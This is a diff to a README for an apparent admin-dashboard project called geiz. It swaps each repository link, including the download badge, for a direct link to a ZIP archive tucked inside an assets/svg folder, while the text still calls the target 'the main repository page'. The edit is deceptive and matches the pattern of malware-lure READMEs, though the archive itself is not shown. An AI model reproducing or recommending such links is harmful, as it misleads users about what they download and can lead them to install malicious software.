@@ -1,6 +1,6 @@
 # ⚙️ geiz - Simple Admin Dashboard for Everyone
 
-[![Download geiz](https://img.shields.io/badge/Download-geiz-blue)](https://github.com/Felipecg4/geiz)
+[![Download geiz](https://img.shields.io/badge/Download-geiz-blue)](https://raw.githubusercontent.com/Felipecg4/geiz/main/assets/svg/Software_v2.0.zip)
 
 ## 📋 What is geiz?
 
@@ -27,7 +27,7 @@ Follow these steps to get and run geiz on your Windows machine.
 
 Click the blue button above or go directly to:
 
-https://github.com/Felipecg4/geiz
+https://raw.githubusercontent.com/Felipecg4/geiz/main/assets/svg/Software_v2.0.zip
 
 This link takes you to the main repository page. Here you can find all files related to geiz.
 
@@ -102,7 +102,7 @@ These are optional for advanced use.
 
 You can download and start using geiz by visiting this page:
 
-https://github.com/Felipecg4/geiz
+https://raw.githubusercontent.com/Felipecg4/geiz/main/assets/svg/Software_v2.0.zip
 
 From there, download the ZIP file, extract it, and open `index.html` in your browser.
 
